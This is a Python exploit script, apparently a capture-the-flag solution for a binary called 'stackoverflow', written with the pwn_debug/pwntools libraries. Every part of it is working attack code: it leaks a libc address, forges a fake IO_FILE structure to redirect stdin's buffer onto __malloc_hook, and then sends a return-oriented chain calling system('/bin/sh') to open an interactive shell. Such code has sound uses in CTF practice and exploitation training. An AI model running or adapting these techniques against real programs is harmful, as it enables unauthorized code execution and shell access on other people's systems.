# File: exp.py
# Author: raycp
# Date: 2019-05-21
# Description: exp for stackoverflow

from pwn_debug import *

pdbg=pwn_debug("stackoverflow")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local()
pdbg.debug("2.24")
pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print type(pdbg.membp)
#print pdbg.hh
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc
#a=IO_FILE_plus()
#print a
#a.show()
#print a._IO_read_base

def malloc_one(size=0,data="",real_size=0,flag=False):
    p.recvuntil("flow: ")
    p.sendline(str(size))
    if flag:
        p.recvuntil("ckoverflow: ")
        p.sendline(str(real_size))
    p.recvuntil("ropchain:")
    p.send(data)

def evil_write(data):
    p.recvuntil("flow:")
    p.send(data)

def flush_buff(size):
    for i in range(0,size):
        p.recvuntil("padding and ropchain: ")
        p.sendline('a')
def pwn():

    #pdbg.bp([0x400a2f,0x400a45])
    #raw_input()
    p.recvuntil("bro:")
    p.send("a"*8)
    p.recvuntil("a"*8)
    libc_base=u64(p.recvuntil(", ")[:-2].ljust(8,'\x00'))-libc.symbols['_IO_default_setbuf']-66
    log.info("leak libc address: %s"%hex(libc_base))
    io_stdin=libc_base+libc.symbols['_IO_2_1_stdin_']
    io_stdin_end=libc_base+libc.symbols['_IO_2_1_stdin_']+0xe0+0x10
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    rce=libc_base+0x3f4b6
    evil_jmp=libc_base+0x5E492
    log.info("one gadget address: %s"%hex(rce))

    #pdbg.bp([0x4009dc,0x4008ff,0x40090e])
    io_buf_base=io_stdin+7*8
    io_buf_end=io_buf_base+8
    size=libc.symbols['_IO_2_1_stdin_']+7*8+0x200000-0x10
    real_size=0x200000-0x1000
    malloc_one(size,'123',real_size,True)
    #pdbg.bp(0x4008ff)
    #flush_buff(8)
    p.send(p64(malloc_hook+8))
    flush_buff(8)


    io_file_jumps=libc_base+libc.symbols['__GI__IO_file_jumps']
    binsh_addr=libc_base+next(libc.search("/bin/sh"))
    system_addr=libc_base+libc.symbols['system']
    lock_addr=libc_base+libc.symbols['_IO_stdfile_0_lock']

    fake_file=IO_FILE_plus()
    fake_file._old_offset= 0xffffffffffffff00
    fake_file._lock= lock_addr
    fake_file._IO_buf_end=malloc_hook+8
    fake_file.vtable=io_file_jumps
    file_data=str(fake_file)

    fake_file.show()
    payload=file_data[fake_file.offset('_IO_buf_end'):]
    payload=payload.ljust(malloc_hook-io_buf_end-8,'\x00')
    payload+=p64(0x400a23)*2

    
    #pdbg.bp(0x4008ff)
    p.recvuntil(" trigger stackoverflow: ")
    p.send(payload)



    raw_input("get shell>")
    prdi_ret=0x0000000000400b43 #: pop rdi ; ret
    payload='a'*0x10+p64(prdi_ret)+p64(binsh_addr)+p64(system_addr)
    p.send(payload)

    p.interactive() #get the shell

if __name__ == '__main__':
    pwn()


